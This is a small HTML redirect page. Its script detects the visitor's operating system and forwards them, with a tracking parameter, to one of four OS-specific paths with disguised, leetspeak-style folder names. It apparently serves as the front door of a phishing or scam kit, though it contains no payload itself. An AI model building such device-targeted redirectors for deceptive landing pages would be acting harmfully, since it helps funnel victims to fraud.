<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Redirect</title>

<script>
(function () {

    function getParam(name) {
        return new URLSearchParams(window.location.search).get(name) || "";
    }

    function detectOS() {
        const ua = navigator.userAgent.toLowerCase();

        if (ua.includes("android")) return "Android";
        if (ua.includes("iphone") || ua.includes("ipad")) return "iOS";
        if (ua.includes("mac")) return "MacOS";
        if (ua.includes("win")) return "Windows";
        return "Other";
    }

    let alpha = getParam("alpha");
    let anph = getParam("Anph");

    if (alpha) localStorage.setItem("alpha", alpha);

    if (!anph) {
        document.body.innerHTML = "<h2 style='color:red;text-align:center;'>Missing Anph parameter</h2>";
        return;
    }

    let os = detectOS();
    let path = "";

    if (os === "Android") {
        path = "/andx010usahTml/index.html";
    } else if (os === "iOS") {
        path = "/ioxs010usxhYMl/index.html";
    } else if (os === "MacOS") {
        path = "/MerxiC0deinfousahtml/index.html";
    } else {
        path = "/webC0deinfousavhtml/index.html";
    }

    let finalURL = path + "?Anph=" + encodeURIComponent(anph);

    console.log("Redirecting to:", finalURL);

    window.location.replace(finalURL);

})();
</script>

</head>
<body>
<p style="text-align:center;">Redirecting...</p>
</body>
</html>
